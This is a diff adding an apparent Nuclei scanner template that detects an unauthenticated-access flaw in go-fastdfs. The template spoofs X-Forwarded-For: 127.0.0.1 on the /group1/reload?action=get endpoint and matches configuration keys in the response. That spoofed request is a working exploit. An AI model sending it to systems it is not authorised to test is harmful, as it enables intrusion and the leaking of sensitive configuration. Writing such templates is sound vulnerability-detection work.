@@ -1,0 +1,27 @@
+id: go-fastdfs-unauth
+
+info:
+  name: Go-fastdfs GetClientIp 未授权访问
+  author: SleepingBag945
+  severity: high
+  description: |
+    Go-fastdfs GetClientIp方法存在XFF头绕过漏洞，攻击者通过漏洞可以未授权调用接口，获取配置文件等敏感信息
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/group1/reload?action=get"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"download_domain":'
+          - '"download_use_token":'
+          - '"default_scene":'
+        condition: and
